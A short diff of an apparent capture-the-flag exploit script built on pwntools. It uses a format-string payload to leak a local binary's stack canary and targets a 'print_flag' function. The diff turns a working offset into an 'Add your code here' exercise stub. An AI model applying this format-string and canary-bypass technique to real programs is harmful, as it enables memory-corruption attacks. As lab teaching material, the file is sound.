@@ -8,17 +8,12 @@ r = process([exe.path])
 # gdb.attach(r)
 
 r.recvuntil(b"What's your name? ")
-r.sendline(b"%15$llu") # leak the stack canary as decimal
+r.sendline(b"%1$llu") #Add your code here
 
 val = r.recvuntil(b"What's your message? ")
-log.info(val)
-print(val.decode(errors="ignore")) 
-match = re.match(b"Hello, ([0-9]+)\n!.*", val)
-if not match:
-    log.error(f"Failed to parse canary from: {val}")
-    exit(1)
-canary = int(match.group(1))
-log.info(f"Canary: {canary:#x}")
+# log.info(val)
+canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
+log.info(f"Canary: {canary:x}")
 
 win = exe.symbols['print_flag']
 # log.info(hex(win))
